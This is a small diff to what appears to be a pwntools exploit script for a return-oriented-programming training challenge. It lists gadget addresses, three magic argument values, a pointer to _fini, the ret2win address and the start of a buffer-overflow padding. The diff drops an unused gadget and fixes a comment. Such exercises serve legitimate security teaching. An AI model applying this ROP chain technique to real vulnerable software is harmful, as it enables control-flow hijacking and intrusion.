@@ -50,12 +50,11 @@ POPRSIR15 = p64(0x4006a1) # pop rsi ; pop r15 ; ret
 MOVRDXR15_MOVRSIR14 = p64(0x400680)
 # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15
 POPRBXRBPR12R13R14R15 = p64(0x40069a)
-POPR14R15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
 ARG0 = 0xdeadbeefdeadbeef
 ARG1 = 0xcafebabecafebabe
 ARG2 = 0xd00df00dd00df00d
 DATA = 0x601028
-POINTER_TO_FINI = p64(0x600e48) # *0x600e48 == 0x00000000_004006b4 <- pop
+POINTER_TO_FINI = p64(0x600e48) # *0x600e48 == 0x00000000_004006b4 <- _fini (does nothing but ret)
 RET2WIN = 0x400510
 
 attack = b"A"*0x28
